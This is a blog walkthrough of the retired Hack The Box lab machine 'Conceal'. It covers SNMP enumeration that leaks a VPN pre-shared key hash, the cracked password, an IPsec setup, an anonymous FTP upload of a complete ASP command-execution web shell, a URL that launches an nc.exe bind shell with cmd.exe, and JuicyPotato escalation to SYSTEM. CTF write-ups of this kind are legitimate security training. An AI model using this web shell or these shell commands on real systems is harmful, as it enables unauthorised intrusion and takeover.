---
layout: post
title: "Conceal: Hack The Box Walkthrough"
date: 2019-05-19 01:58:50 +0000
last_modified_at: 2019-05-19 01:58:55 +0000
category: Walkthrough
tags: ["Hack The Box", Conceal, retired]
comments: true
image:
  feature: conceal-htb-walkthrough.jpg
  credit: d_abisai7 / Pixabay
  creditlink: https://pixabay.com/photos/frog-nature-green-concealment-lawn-1445128/
---

This post documents the complete walkthrough of Conceal, a retired vulnerable [VM][1] created by [bashlogic][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Conceal is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.116

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-05 01:30:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 161/udp on 10.10.10.116
```

Interesting! There's only one open port `161/udp`, which is SNMP. For the first time, I didn't use `nmap` to perform further enumeration.

### Simple Network Management Protocol

Let's use `snmp-check` and see what we can find.

```
# snmp-check -v2c -c public 10.10.10.116
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.10.116:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 10.10.10.116
  Hostname                      : Conceal
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
  Location                      : -
  Uptime snmp                   : 00:01:20.64
  Uptime system                 : 00:00:56.07
  System date                   : 2019-3-7 02:41:00.0
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Destitute           
  Administrator       
  DefaultAccount      

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 2
  TCP segments sent             : 1
  TCP segments retrans          : 0
  Input datagrams               : 251
  Delivered datagrams           : 269
  Output datagrams              : 241

[*] Network interfaces:

  Interface                     : [ up ] Software Loopback Interface 1
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 1073 Mbps
  MTU                           : 1500
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IKEv2)
  Id                            : 2
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (PPTP)
  Id                            : 3
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
  Id                            : 4
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (L2TP)
  Id                            : 5
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] Teredo Tunneling Pseudo-Interface
  Id                            : 6
  Mac Address                   : 00:00:00:00:00:00
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IP)
  Id                            : 7
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (SSTP)
  Id                            : 8
  Mac Address                   : :::::
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (IPv6)
  Id                            : 9
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection
  Id                            : 10
  Mac Address                   : 00:50:56:b9:8f:fa
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 17694
  Out octets                    : 30257

  Interface                     : [ down ] WAN Miniport (PPPOE)
  Id                            : 11
  Mac Address                   : :::::
  Type                          : ppp
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ down ] WAN Miniport (Network Monitor)
  Id                            : 12
  Mac Address                   : :::::
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 0
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000
  Id                            : 13
  Mac Address                   : 00:50:56:b9:8f:fa
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 17694
  Out octets                    : 30257

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000
  Id                            : 14
  Mac Address                   : 00:50:56:b9:8f:fa
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 17694
  Out octets                    : 30257

  Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000
  Id                            : 15
  Mac Address                   : 00:50:56:b9:8f:fa
  Type                          : ethernet-csmacd
  Speed                         : 1000 Mbps
  MTU                           : 1500
  In octets                     : 17694
  Out octets                    : 30257


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  10                    10.10.10.116          255.255.255.0         1                   
  1                     127.0.0.1             255.0.0.0             1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               10.10.10.2            0.0.0.0               281                 
  10.10.10.0            10.10.10.116          255.255.255.0         281                 
  10.10.10.116          10.10.10.116          255.255.255.255       281                 
  10.10.10.255          10.10.10.116          255.255.255.255       281                 
  127.0.0.0             127.0.0.1             255.0.0.0             331                 
  127.0.0.1             127.0.0.1             255.255.255.255       331                 
  127.255.255.255       127.0.0.1             255.255.255.255       331                 
  224.0.0.0             127.0.0.1             240.0.0.0             331                 
  255.255.255.255       127.0.0.1             255.255.255.255       331                 

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               21                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               135                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              
  0.0.0.0               49664                 0.0.0.0               0                     listen              
  0.0.0.0               49665                 0.0.0.0               0                     listen              
  0.0.0.0               49666                 0.0.0.0               0                     listen              
  0.0.0.0               49667                 0.0.0.0               0                     listen              
  0.0.0.0               49668                 0.0.0.0               0                     listen              
  0.0.0.0               49669                 0.0.0.0               0                     listen              
  0.0.0.0               49670                 0.0.0.0               0                     listen              
  10.10.10.116          139                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               161                 
  0.0.0.0               500                 
  0.0.0.0               4500                
  0.0.0.0               5353                
  0.0.0.0               5355                
  0.0.0.0               63602               
  10.10.10.116          137                 
  10.10.10.116          138                 

[*] Network services:

  Index                 Name                
  0                     Power               
  1                     Server              
  2                     Themes              
  3                     IP Helper           
  4                     DNS Client          
  5                     Data Usage          
  6                     Superfetch          
  7                     DHCP Client         
  8                     Time Broker         
  9                     Workstation         
  10                    SNMP Service        
  11                    User Manager        
  12                    VMware Tools        
  13                    CoreMessaging       
  14                    Plug and Play       
  15                    Print Spooler       
  16                    Windows Audio       
  17                    Task Scheduler      
  18                    Windows Search      
  19                    Windows Update      
  20                    Windows Firewall    
  21                    CNG Key Isolation   
  22                    COM+ Event System   
  23                    Windows Event Log   
  24                    IPsec Policy Agent  
  25                    Volume Shadow Copy  
  26                    Group Policy Client
  27                    RPC Endpoint Mapper
  28                    Device Setup Manager
  29                    Network List Service
  30                    System Events Broker
  31                    User Profile Service
  32                    Base Filtering Engine
  33                    Local Session Manager
  34                    Microsoft FTP Service
  35                    TCP/IP NetBIOS Helper
  36                    Cryptographic Services
  37                    Device Install Service
  38                    Tile Data model server
  39                    COM+ System Application
  40                    Diagnostic Service Host
  41                    WMI Performance Adapter
  42                    Shell Hardware Detection
  43                    State Repository Service
  44                    VMware Snapshot Provider
  45                    Diagnostic Policy Service
  46                    Network Connection Broker
  47                    Security Accounts Manager
  48                    Network Location Awareness
  49                    Windows Connection Manager
  50                    Windows Font Cache Service
  51                    Remote Procedure Call (RPC)
  52                    DCOM Server Process Launcher
  53                    Windows Audio Endpoint Builder
  54                    Application Host Helper Service
  55                    Network Store Interface Service
  56                    Client License Service (ClipSVC)
  57                    Distributed Link Tracking Client
  58                    System Event Notification Service
  59                    World Wide Web Publishing Service
  60                    Portable Device Enumerator Service
  61                    Windows Defender Antivirus Service
  62                    Windows Management Instrumentation
  63                    Windows Process Activation Service
  64                    Distributed Transaction Coordinator
  65                    IKE and AuthIP IPsec Keying Modules
  66                    Microsoft Account Sign-in Assistant
  67                    VMware CAF Management Agent Service
  68                    VMware Physical Disk Helper Service
  69                    Background Tasks Infrastructure Service
  70                    Program Compatibility Assistant Service
  71                    VMware Alias Manager and Ticket Service
  72                    Connected User Experiences and Telemetry
  73                    WinHTTP Web Proxy Auto-Discovery Service
  74                    Windows Defender Security Centre Service
  75                    Windows Push Notifications System Service
  76                    Windows Defender Antivirus Network Inspection Service

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     running               System Idle Process                                             
  4                     running               System                                                          
  308                   running               smss.exe                                                        
  368                   running               svchost.exe           C:\Windows\system32\  -k LocalService     
  376                   running               svchost.exe           C:\Windows\system32\  -k netsvcs          
  392                   running               csrss.exe                                                       
  468                   running               wininit.exe                                                     
  488                   running               csrss.exe                                                       
  568                   running               winlogon.exe                                                    
  592                   running               services.exe                                                    
  620                   running               lsass.exe             C:\Windows\system32\                      
  696                   running               fontdrvhost.exe                                                 
  704                   running               fontdrvhost.exe                                                 
  756                   running               svchost.exe           C:\Windows\system32\  -k DcomLaunch       
  812                   running               svchost.exe           C:\Windows\system32\  -k RPCSS            
  884                   running               vmacthlp.exe          C:\Program Files\VMware\VMware Tools\                      
  904                   running               dwm.exe                                                         
  952                   running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  972                   running               svchost.exe           C:\Windows\system32\  -k LocalServiceNoNetwork
  1000                  running               svchost.exe           C:\Windows\System32\  -k LocalSystemNetworkRestricted
  1164                  running               svchost.exe           C:\Windows\System32\  -k NetworkService   
  1172                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1264                  running               svchost.exe           C:\Windows\System32\  -k LocalServiceNetworkRestricted
  1272                  running               svchost.exe           C:\Windows\system32\  -k LocalServiceNetworkRestricted
  1368                  running               spoolsv.exe           C:\Windows\System32\                      
  1588                  running               svchost.exe           C:\Windows\system32\  -k appmodel         
  1668                  running               Memory Compression                                              
  1708                  running               dllhost.exe           C:\Windows\system32\  /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}
  1740                  running               svchost.exe           C:\Windows\system32\  -k apphost          
  1768                  running               svchost.exe           C:\Windows\System32\  -k utcsvc           
  1780                  running               svchost.exe           C:\Windows\system32\  -k ftpsvc           
  1836                  running               SecurityHealthService.exe                                            
  1852                  running               snmp.exe              C:\Windows\System32\                      
  1868                  running               VGAuthService.exe     C:\Program Files\VMware\VMware Tools\VMware VGAuth\                      
  1888                  running               vmtoolsd.exe          C:\Program Files\VMware\VMware Tools\                      
  1916                  running               ManagementAgentHost.exe  C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\                      
  1932                  running               svchost.exe           C:\Windows\system32\  -k iissvcs          
  1952                  running               MsMpEng.exe                                                     
  2124                  running               sysprep.exe           Sysprep\              /respecialize /quiet
  2336                  running               svchost.exe           C:\Windows\system32\  -k NetworkServiceNetworkRestricted
  2424                  running               powershell.exe                              -exec bypass -file c:\admin_checks\checks.ps1
  2536                  running               taskhostw.exe                               SYSTEM              
  2684                  running               conhost.exe           \??\C:\Windows\system32\  0x4                 
  2704                  running               dllhost.exe           C:\Windows\system32\  /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}

[*] Storage information:

  Description                   : ["C:\\ Label:  Serial Number 9606be7b"]
  Device id                     : [#<SNMP::Integer:0x00005571326fd1e8 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055713252e3d0 @value=4096>]
  Memory size                   : 59.51 GB
  Memory used                   : 10.70 GB

  Description                   : ["D:\\"]
  Device id                     : [#<SNMP::Integer:0x0000557132711b20 @value=2>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x0000557132752be8 @value=0>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes

  Description                   : ["Virtual Memory"]
  Device id                     : [#<SNMP::Integer:0x000055713276e118 @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x000055713277fb48 @value=65536>]
  Memory size                   : 3.12 GB
  Memory used                   : 803.44 MB

  Description                   : ["Physical Memory"]
  Device id                     : [#<SNMP::Integer:0x000055713279aec0 @value=4>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x00005571327c1318 @value=65536>]
  Memory size                   : 2.00 GB
  Memory used                   : 837.12 MB


[*] File system information:

  Index                         : 1
  Mount point                   :
  Remote mount point            : -
  Access                        : 1
  Bootable                      : 0

[*] Device information:

  Id                    Type                  Status                Descr               
  1                     unknown               running               Microsoft XPS Document Writer v4
  2                     unknown               running               Microsoft Print To PDF
  3                     unknown               running               Microsoft Shared Fax Driver
  4                     unknown               running               Unknown Processor Type
  5                     unknown               running               Unknown Processor Type
  6                     unknown               unknown               Software Loopback Interface 1
  7                     unknown               unknown               WAN Miniport (IKEv2)
  8                     unknown               unknown               WAN Miniport (PPTP)
  9                     unknown               unknown               Microsoft Kernel Debug Network Adapter
  10                    unknown               unknown               WAN Miniport (L2TP)
  11                    unknown               unknown               Teredo Tunneling Pseudo-Interface
  12                    unknown               unknown               WAN Miniport (IP)   
  13                    unknown               unknown               WAN Miniport (SSTP)
  14                    unknown               unknown               WAN Miniport (IPv6)
  15                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection
  16                    unknown               unknown               WAN Miniport (PPPOE)
  17                    unknown               unknown               WAN Miniport (Network Monitor)
  18                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer
  19                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-
  20                    unknown               unknown               Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer L
  21                    unknown               unknown               D:\                 
  22                    unknown               running               Fixed Disk          
  23                    unknown               running               IBM enhanced (101- or 102-key) keyboard, Subtype=(0)

[*] Software components:

  Index                 Name                
  1                     Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161
  2                     VMware Tools        
  3                     Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161

[*] IIS server information:

  TotalBytesSentLowWord         : 0
  TotalBytesReceivedLowWord     : 0
  TotalFilesSent                : 0
  CurrentAnonymousUsers         : 0
  CurrentNonAnonymousUsers      : 0
  TotalAnonymousUsers           : 0
  TotalNonAnonymousUsers        : 0
  MaxAnonymousUsers             : 0
  MaxNonAnonymousUsers          : 0
  CurrentConnections            : 0
  MaxConnections                : 0
  ConnectionAttempts            : 0
  LogonAttempts                 : 0
  Gets                          : 0
  Posts                         : 0
  Heads                         : 0
  Others                        : 0
  CGIRequests                   : 0
  BGIRequests                   : 0
  NotFoundErrors                : 0

```

You can see that an IKE service is actually present at `500/udp` among other services. Somehow, the rest of the services are concealed. I take back my word that I don't need `nmap` this time. :wink:

Let's use `nmap` to scan for the IKE version.

```
# nmap -sU -p 500 --script ike-version 10.10.10.116
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-05 02:41 UTC
Nmap scan report for 10.10.10.116
Host is up (0.18s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version:
|   vendor_id: Microsoft Windows 8
|   attributes:
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
```

It appears to be using IKEv1. Alternatively, we can use `ike-scan` to determine the version.

```
# ike-scan 10.10.10.116 -M
Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.10.116    Main Mode Handshake returned
        HDR=(CKY-R=0a8ddd4d8222f452)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)                                                                              
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)
        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)
        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)
        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)
        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)

Ending ike-scan 1.9.4: 1 hosts scanned in 0.208 seconds (4.81 hosts/sec).  1 returned handshake; 0 returned notify
```

OK, I'm pretty sure it's IKEv1. IKEv1 has two phases, Phase 1 operates in Main Mode (6-way handshake) or Aggressive Mode (3-way handshake) while Phase 2 operates in Quick Mode.

At the very beginning of the `snmp-check`'s output lies the pre-shared key for authentication during Phase 1 (Main Mode) of the Internet Key Exchange (IKE). It's easy to miss that if you don't know what you are looking for.

```
IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
```

It turns out that this is not the shared secret. Instead, this is the MD5 hash of the password. A quick search for the hash in [online cracker](https://hashkiller.co.uk/Cracker/MD5) reveals the password to be `Dudecake1!`

### IPSec - Internet Key Exchange (IKE) and Encapulating Security Payload (ESP)

Good thing Linux is well-eqipped to take advantage of this, all we have to do is to install [strongSwan](https://www.strongswan.org/). The problem now is to find the correct configuration because IPSec is complex and we don't know the configuration on the "right" side as per strongSwan's parlance.

Well, we know enough security parameters for Phase 1 - Main Mode from `ike-scan`. We can more or less "guess" the security parameters for Phase 2 - Quick Mode. We also want to establish the transport mode of IPSec because we are already in a VPN (OpenVPN) and the connection is between my HTB's assigned IP address and that of Conceal's.

### ipsec.conf

With that in mind, let's construct the connection.

<div class="filename"><span>/etc/ipsec.conf</span></div>

```
config setup

conn %default
       inactivity=1h
       keyexchange=ikev1
       ike=3des-sha1-modp1024!
       esp=3des-sha1
       authby=secret

conn conceal
       left=%any
       right=10.10.10.116
       rightsubnet=10.10.10.116[tcp/%any]
       type=transport
       auto=add
```

The `ike` parameter specifies the cipher suite that we want to use. This is not new to us because this is the cipher suite exposed by `ike-scan` earlier on.

The `inactivity` parameter specifies the timeout interval, after which a CHILD_SA is closed if it did not send or receive any traffic.

The `esp` parameter is the only parameter that we need to guess. Judging from Microsoft's track history of *not* complying with security recommendations or open standards in order to be backward compatible, this can be easily guessed.

The `rightsubnet` parameter specifies we are connecting securely (over IPSec) to Conceal for all TCP ports. Recall from SNMP that Conceal is also listening on `21/tcp`, `80/tcp`, `139/tcp`, and `445/tcp`.

The `type` parameter specifies the type of connection we want to establish. In this case, we want to establish transport mode.

### ipsec.secrets

Simple and self-explanatory.

<div class="filename"><span>/etc/ipsec.secrets</span></div>

```
 : PSK "Dudecake1!"
```

### Establishing IPSec Transport Mode

Time to establish the connection!


{% include image.html image_alt="29e2bb81.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/29e2bb81.png" %}


When that's done, let's test it out with my browser since `80/tcp` is open.


{% include image.html image_alt="1195cdab.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/1195cdab.png" %}


We can now re-run `nmap` on the open ports. Note that we need to use `nmap`'s connect scan with the `-sT` switch because,

> Nmap asks the underlying operating system to establish a connection with the target machine and port by issuing the connect system call. This is the same high-level system call that web browsers, P2P clients, and most other network-enabled applications use to establish a connection.

```
# nmap -n -v -Pn -sT -p21,80,139,445 10.10.10.116 -A --reason -oN nmap.txt
...
PORT    STATE SERVICE       REASON  VERSION
21/tcp  open  ftp           syn-ack Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|_  SYST: Windows_NT
80/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
...
Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-03-07 00:53:56
|_  start_date: 2019-03-06 23:06:41
```

To be honest, I could have skipped this step. I did it to show some love to `nmap`.

### Directory/File Enumeration

Finally, we can continue with our enumeration journey. Let's start with `wfuzz`.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 http://10.10.10.116/FUZZ                                                     
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://10.10.10.116/FUZZ
Total requests: 4593

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

004186:  C=301      1 L       10 W          150 Ch        "upload"

Total time: 233.0655
Processed Requests: 4593
Filtered Requests: 4592
Requests/sec.: 19.70690
```

Hmm. Where can I upload files? FTP of course.


{% include image.html image_alt="7ba7f207.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/7ba7f207.png" %}


Here's proof that the file was successfully uploaded.


{% include image.html image_alt="97ad894b.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/97ad894b.png" %}


Armed with this knowledge, we can upload a simple ASP file that executes commands remotely.

<div class="filename"><span>hello.asp</span></div>

```html
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>


<html>
<body>
<form action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</form>
<pre>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
</pre>
<br>
<b>Command Output:</b>
<br>
<pre>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write Server.HTMLEncode(thisDir)%>
</pre>
<br>
</body>
</html>
```

While we are at it, we might as well upload `nc.exe` to see if we can spawn a bind shell because I noticed that there's a script that deletes whatever is in `/upload` rather quickly.


{% include image.html image_alt="8c765d2a.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/8c765d2a.png" %}


Remote command execution unlocked! Time to spawn that bind shell.

```
http://10.10.10.116/upload/hello.asp?cmd=c%3A%5Cinetpub%5Cwwwroot%5Cupload%5Cnc.exe+-lnvp+12345+-e+cmd.exe
```


{% include image.html image_alt="d18e05b1.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/d18e05b1.png" %}


Awesome.

The `proof.txt` is at `Destitute`'s desktop.


{% include image.html image_alt="18d89cbb.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/18d89cbb.png" %}


## Privilege Escalation

During enumeration of `destitute`'s account, I notice that the account has these privileges.


{% include image.html image_alt="43c7f1eb.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/43c7f1eb.png" %}


I smell potato cooking! There were different types of potato uncovered in my reseach and oh boy, in the end the "juicy" one seems the most promising because of the various command switches available. More importantly, I can change to a different COM server other than BITS.

For some reason I couldn't recall, I decided to go for `UsoSvc`'s CLSID, which can be found [here](https://ohpe.it/juicy-potato/CLSID/). Earlier on, I'd already established that Conceal is a Windows 10 Enterprise.

The CLSID of `UsoSvc` is `{B91D5831-B1BD-4608-8198-D72E155020F7}`. We are now set to run the [exploit](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts).

I upload the exploit `jp.exe` to `C:\inetpub\wwwroot\upload` via FTP.


{% include image.html image_alt="c82281ea.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/c82281ea.png" %}


Then I run the exploit.


{% include image.html image_alt="c77223ea.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/c77223ea.png" %}


Meanwhile at my `nc` listener, a `SYSTEM` shell appears.


{% include image.html image_alt="32f269c0.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/32f269c0.png" %}


 Getting `proof.txt` is trivial when you have `SYSTEM` privileges.


 {% include image.html image_alt="4f0808db.png" image_src="/6cd0c453-7dba-47a7-af54-16f65dccfab9/4f0808db.png" %}


[1]: https://www.hackthebox.eu/home/machines/profile/168
[2]: https://www.hackthebox.eu/home/users/profile/1545
[3]: https://www.hackthebox.eu/
